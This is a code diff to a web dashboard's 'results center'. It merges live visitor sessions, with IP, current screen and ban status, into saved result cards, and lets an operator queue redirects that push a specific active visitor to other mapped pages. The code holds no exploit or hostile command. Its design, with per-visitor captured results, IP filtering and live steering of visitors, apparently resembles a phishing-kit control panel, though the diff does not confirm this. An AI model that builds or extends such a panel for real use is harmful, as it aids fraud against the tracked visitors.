@@ -610,24 +610,63 @@ function resultActionsMarkup(result, pageSlug) {
   `;
 }
 
-function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = []) {
+function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null) {
+  const commandLabel = command?.note || command?.targetUrl || "";
+  return `
+    <div class="session-command result-live-command">
+      <div class="session-route-buttons" aria-label="Redirect active user">
+        ${pageTargets.length ? pageTargets.map((target) => `
+          <button type="button" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}">
+            ${escapeHtml(target.label)}
+          </button>
+        `).join("") : "<span>No mapped pages found</span>"}
+      </div>
+      <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}">Clear</button>
+      <small>${command?.targetUrl ? `Queued: ${escapeHtml(commandLabel)}` : "No command queued"}</small>
+    </div>
+  `;
+}
+
+function activeSessionCardMarkup(session, page, pageTargets = [], command = null) {
+  return `
+    <article class="active-session-card">
+      <div>
+        <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
+        <h4>${escapeHtml(session.ip || "unknown")}</h4>
+        <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
+      </div>
+      <div class="session-meta">
+        <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
+        <span>${command?.targetUrl ? `Queued: ${escapeHtml(command.note || command.targetUrl || "")}` : "No command"}</span>
+      </div>
+      ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command)}
+    </article>
+  `;
+}
+
+function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
   const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
   const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
   const lastDate = new Date(session.lastSeen);
   const lastSeen = Number.isNaN(lastDate.getTime()) ? "unknown" : `${lastDate.toLocaleDateString()} / ${lastDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}`;
+  const activeSession = options.activeSession || null;
+  const command = options.command || null;
+  const pageTargets = options.pageTargets || [];
   return `
-    <article class="result-session-card">
+    <article class="result-session-card ${activeSession ? "is-live" : ""}">
       <div class="result-session-head">
         <div>
           <small>${escapeHtml(session.sessionId)}</small>
           <h3>${session.results.length} page ${session.results.length === 1 ? "event" : "events"}</h3>
         </div>
-        <span>${escapeHtml(lastSeen)}</span>
+        <span>${activeSession ? "Live now" : escapeHtml(lastSeen)}</span>
       </div>
       <div class="result-meta">
         <span>IP ${escapeHtml(sessionIp)}</span>
         <span>${escapeHtml(ipStatus)}</span>
+        ${activeSession ? `<span>${escapeHtml(activeSession.screen || "active page")} / ${escapeHtml(formatTrafficTime(activeSession.lastSeenAt))}</span>` : ""}
       </div>
+      ${activeSession ? sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command) : ""}
       <div class="session-result-timeline">
         ${session.results.map((result, index) => `
           <article class="result-card compact">
@@ -3815,6 +3854,9 @@ async function renderResultsCenter(pageSlug = "page-a") {
   const results = page.results || [];
   const savedSessions = resultSessions(results);
   const activeSessions = page.activeSessions || [];
+  const activeSessionsById = new Map(activeSessions.map((session) => [session.sessionId, session]));
+  const savedSessionIds = new Set(savedSessions.map((session) => session.sessionId));
+  const activeSessionsWithoutResults = activeSessions.filter((session) => !savedSessionIds.has(session.sessionId));
   const sessionCommands = page.configs?.sessionCommands || {};
   const bannedIps = page.securityConfig?.bannedIps || [];
   const whitelistIps = page.securityConfig?.whitelistIps || [];
@@ -3844,43 +3886,20 @@ async function renderResultsCenter(pageSlug = "page-a") {
         <div class="builder-heading">
           <div>
             <small>live users</small>
-            <h3>Active page sessions</h3>
+            <h3>Waiting for first result</h3>
           </div>
           <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
         </div>
         <div class="active-session-list">
-          ${activeSessions.length ? activeSessions.map((session) => {
+          ${activeSessionsWithoutResults.length ? activeSessionsWithoutResults.map((session) => {
             const command = sessionCommands[session.sessionId];
-            const commandLabel = command?.note || command?.targetUrl || "";
-            return `
-              <article class="active-session-card">
-                <div>
-                  <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
-                  <h4>${escapeHtml(session.ip || "unknown")}</h4>
-                  <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
-                </div>
-                <div class="session-meta">
-                  <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
-                  <span>${command?.targetUrl ? `Queued: ${escapeHtml(commandLabel)}` : "No command"}</span>
-                </div>
-                <div class="session-command">
-                  <div class="session-route-buttons" aria-label="Redirect active user">
-                    ${pageTargets.length ? pageTargets.map((target) => `
-                      <button type="button" data-session-redirect="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}">
-                        ${escapeHtml(target.label)}
-                      </button>
-                    `).join("") : "<span>No mapped pages found</span>"}
-                  </div>
-                  <button type="button" data-session-clear="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Clear</button>
-                </div>
-              </article>
-            `;
+            return activeSessionCardMarkup(session, page, pageTargets, command);
           }).join("") : `
             <article class="active-session-card empty-session">
               <div>
-                <small>idle</small>
-                <h4>No active users right now</h4>
-                <p>Open the live page and keep it active; sessions appear here from recent traffic events.</p>
+                <small>${activeSessions.length ? "merged" : "idle"}</small>
+                <h4>${activeSessions.length ? "Active sessions are shown with their results" : "No active users right now"}</h4>
+                <p>${activeSessions.length ? "Redirect buttons now live inside the matching saved session cards below." : "Open the live page and keep it active; sessions appear here from recent traffic events."}</p>
               </div>
             </article>
           `}
@@ -3888,7 +3907,11 @@ async function renderResultsCenter(pageSlug = "page-a") {
       </article>
 
       <div class="results-list">
-        ${savedSessions.length ? savedSessions.map((session) => sessionResultsMarkup(session, page, bannedIps, whitelistIps)).join("") : `
+        ${savedSessions.length ? savedSessions.map((session) => sessionResultsMarkup(session, page, bannedIps, whitelistIps, {
+          activeSession: activeSessionsById.get(session.sessionId),
+          command: sessionCommands[session.sessionId],
+          pageTargets
+        })).join("") : `
           <article class="security-panel">
             <small>empty</small>
             <h3>No saved results yet</h3>
